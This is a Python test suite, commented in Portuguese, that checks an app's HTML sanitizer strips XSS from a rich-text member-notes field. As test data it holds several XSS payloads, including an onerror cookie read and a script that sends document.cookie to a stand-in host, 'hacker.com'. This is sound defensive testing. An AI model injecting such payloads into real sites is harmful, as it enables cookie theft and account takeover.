#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
🧪 SiGI — Suíte de Testes Automatizados: Editor de Texto Rico & Sanitização XSS no Campo 'Observações'
"""

import sys
import os
from pathlib import Path
from datetime import date

BASE_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(BASE_DIR))

if sys.platform == "win32":
    sys.stdout.reconfigure(encoding="utf-8")

from app import create_app, db
from app.models import Member, User
from utils.sanitizer import sanitizar_html

app = create_app()
app.config["TESTING"] = True
app.config["WTF_CSRF_ENABLED"] = False

def run_tests():
    print("\n" + "=" * 75)
    print("  🧪 INICIANDO TESTES DO EDITOR DE TEXTO RICO & SANITIZAÇÃO XSS")
    print("=" * 75 + "\n")

    # -------------------------------------------------------------
    # 1. TESTES UNITÁRIOS DO SANITIZADOR
    # -------------------------------------------------------------
    print("🔹 [1/6] Testando Sanitização e Neutralização de XSS...")

    # Ataque com <script>
    xss_script = '<p>Texto normal <script>alert("XSS Attack!");</script> continuação.</p>'
    limpo_script = sanitizar_html(xss_script)
    assert "<script>" not in limpo_script
    assert "alert" not in limpo_script
    assert "<p>Texto normal" in limpo_script
    print("   ✅ Injeção de <script> neutralizada com sucesso.")

    # Ataque com inline event handler (onerror)
    xss_img = '<p>Foto <img src="x" onerror="alert(document.cookie)"> teste</p>'
    limpo_img = sanitizar_html(xss_img)
    assert "onerror" not in limpo_img
    assert "alert" not in limpo_img
    print("   ✅ Injeção de 'onerror' e atributos de eventos inline removidos.")

    # Ataque com javascript: no href
    xss_link = '<p><a href="javascript:alert(1)">Clique Aqui</a></p>'
    limpo_link = sanitizar_html(xss_link)
    assert "javascript:" not in limpo_link
    print("   ✅ Protocolo perigoso 'javascript:' bloqueado em links.")

    # Ataque com <iframe> e <embed>
    xss_frame = '<p>Vídeo <iframe src="http://evil.com"></iframe> <embed src="evil.swf"></p>'
    limpo_frame = sanitizar_html(xss_frame)
    assert "<iframe" not in limpo_frame
    assert "<embed" not in limpo_frame
    print("   ✅ Tags perigosas <iframe> e <embed> eliminadas.")

    # HTML Rico Válido
    html_valido = '<h2>Histórico Pastoral</h2><p>Membro <strong>muito ativo</strong> e <em>dedicado</em>.</p><ul><li>Ministério de Louvor</li><li>EBD Adultos</li></ul><p>Acesse o site <a href="https://igreja.com.br">aqui</a>.</p>'
    limpo_valido = sanitizar_html(html_valido)
    assert "<h2>Histórico Pastoral</h2>" in limpo_valido
    assert "<strong>muito ativo</strong>" in limpo_valido
    assert "<em>dedicado</em>" in limpo_valido
    assert "<li>Ministério de Louvor</li>" in limpo_valido
    assert 'href="https://igreja.com.br"' in limpo_valido
    assert 'rel="noopener noreferrer"' in limpo_valido
    print("   ✅ Formatação rica legítima (títulos, listas, negrito, links) preservada com segurança.")

    # Campo vazio ou apenas <p><br></p>
    assert sanitizar_html("<p><br></p>") is None
    assert sanitizar_html("<p> </p>") is None
    assert sanitizar_html("") is None
    assert sanitizar_html(None) is None
    print("   ✅ Normalização de conteúdo vazio/espaços para None funcionando.")

    # -------------------------------------------------------------
    # 2. TESTES DE INTEGRAÇÃO NA APLICAÇÃO
    # -------------------------------------------------------------
    with app.test_client() as client:
        with app.app_context():
            # Garante que existe admin para login
            admin = User.query.filter_by(email="admin_teste@sigi.com").first()
            if not admin:
                admin = User(nome="Admin Teste", email="admin_teste@sigi.com", is_admin=True, ativo=True)
                admin.set_password("Admin@123456")
                db.session.add(admin)
                db.session.commit()

        # Login
        client.post("/login", data={"email": "admin_teste@sigi.com", "senha": "Admin@123456"}, follow_redirects=True)

        # ---------------------------------------------------------
        # 3. Criar Membro com Observação Formatada
        # ---------------------------------------------------------
        print("\n🔹 [2/6] Testando Cadastro de Membro com Observações em Texto Rico...")
        with app.app_context():
            old_mem = Member.query.filter_by(email="membro_editor@sigi.com").first()
            if old_mem:
                db.session.delete(old_mem)
                db.session.commit()

        obs_cadastro = "<h3>Anotações Iniciais</h3><p>Transferido da <strong>Igreja Central</strong>.</p><ul><li>Discipulador: Pr. Silva</li></ul>"
        
        res_cad = client.post("/membros/cadastro", data={
            "nome": "Membro Teste Editor Rico",
            "email": "membro_editor@sigi.com",
            "status": "Ativo",
            "funcao": "Membro",
            "observacoes": obs_cadastro
        }, follow_redirects=True)
        assert res_cad.status_code == 200

        with app.app_context():
            membro_cad = Member.query.filter_by(email="membro_editor@sigi.com").first()
            assert membro_cad is not None, "Membro deveria ter sido cadastrado"
            assert "<h3>Anotações Iniciais</h3>" in membro_cad.observacoes
            assert "<strong>Igreja Central</strong>" in membro_cad.observacoes
            membro_id = membro_cad.id
            print(f"   ✅ Membro #{membro_id} cadastrado com observações formatadas salvas com sucesso.")

        # ---------------------------------------------------------
        # 4. Editar Membro e Atualizar Observação com Formatação
        # ---------------------------------------------------------
        print("\n🔹 [3/6] Testando Edição de Membro e Atualização no Editor...")
        obs_editada = "<p>Atualização ministerial em 2026:</p><ul><li>Assumiu a <strong>Liderança dos Jovens</strong></li><li>Acompanhamento pastoral quinzenal</li></ul><p>Mais detalhes no <a href='https://sigi.local/doc'>documento anexo</a>.</p>"

        res_edit = client.post(f"/membros/editar/{membro_id}", data={
            "nome": "Membro Teste Editor Rico",
            "email": "membro_editor@sigi.com",
            "status": "Ativo",
            "funcao": "Diácono",
            "observacoes": obs_editada
        }, follow_redirects=True)
        assert res_edit.status_code == 200

        with app.app_context():
            membro_atualizado = db.session.get(Member, membro_id)
            assert "Liderança dos Jovens" in membro_atualizado.observacoes
            assert "<strong>Liderança dos Jovens</strong>" in membro_atualizado.observacoes
            assert membro_atualizado.funcao == "Diácono"
            print("   ✅ Observações editadas e persistidas com formatação preservada.")

        # ---------------------------------------------------------
        # 5. Tentativa de Envio de Payload Malicioso via POST (Bypass de Frontend)
        # ---------------------------------------------------------
        print("\n🔹 [4/6] Testando Bloqueio de XSS no Backend contra Envio Direto via POST...")
        obs_maliciosa = '<p>Tentativa de invasão <script>document.location="http://hacker.com/steal?cookie="+document.cookie</script></p><div onclick="evil()">Clique</div>'

        res_xss = client.post(f"/membros/editar/{membro_id}", data={
            "nome": "Membro Teste Editor Rico",
            "email": "membro_editor@sigi.com",
            "status": "Ativo",
            "funcao": "Diácono",
            "observacoes": obs_maliciosa
        }, follow_redirects=True)
        assert res_xss.status_code == 200

        with app.app_context():
            membro_xss = db.session.get(Member, membro_id)
            assert "<script>" not in membro_xss.observacoes
            assert "document.cookie" not in membro_xss.observacoes
            assert "onclick" not in membro_xss.observacoes
            assert "<p>Tentativa de invasão" in membro_xss.observacoes
            print("   ✅ Backend sanitizou o payload malicioso e neutralizou o script com 100% de eficácia.")

        # ---------------------------------------------------------
        # 6. Compatibilidade com Membros Legados (Texto Plano)
        # ---------------------------------------------------------
        print("\n🔹 [5/6] Testando Compatibilidade com Membro Legado (Texto Plano Antigo)...")
        with app.app_context():
            membro_legado = Member.query.filter_by(email="membro_legado@sigi.com").first()
            if not membro_legado:
                membro_legado = Member(
                    nome="Membro Legado Teste",
                    email="membro_legado@sigi.com",
                    status="Ativo",
                    funcao="Membro",
                    observacoes="Observação antiga em texto plano simples.\nLinha 2 de histórico sem tags HTML."
                )
                db.session.add(membro_legado)
                db.session.commit()
            legado_id = membro_legado.id

        # Carrega a página de edição do membro legado
        res_view_legado = client.get(f"/membros/editar/{legado_id}")
        assert res_view_legado.status_code == 200
        assert "Observação antiga em texto plano simples" in res_view_legado.get_data(as_text=True)
        print("   ✅ Tela de edição carregou perfeitamente o texto de membro legado sem erros.")

        # ---------------------------------------------------------
        # 7. Limpar Observações
        # ---------------------------------------------------------
        print("\n🔹 [6/6] Testando Limpeza Completa de Observações...")
        res_limpar = client.post(f"/membros/editar/{membro_id}", data={
            "nome": "Membro Teste Editor Rico",
            "email": "membro_editor@sigi.com",
            "status": "Ativo",
            "funcao": "Membro",
            "observacoes": "<p><br></p>" # Editor vazio
        }, follow_redirects=True)
        assert res_limpar.status_code == 200

        with app.app_context():
            membro_limpo = db.session.get(Member, membro_id)
            assert membro_limpo.observacoes is None, "Observações vazias devem ser gravadas como None"
            print("   ✅ Limpeza de observações normalizada com sucesso para None.")

    print("\n" + "=" * 75)
    print("  🎉 TODOS OS TESTES DO EDITOR DE TEXTO RICO PASSARAM COM 100% DE SUCESSO!")
    print("=" * 75 + "\n")

if __name__ == "__main__":
    run_tests()
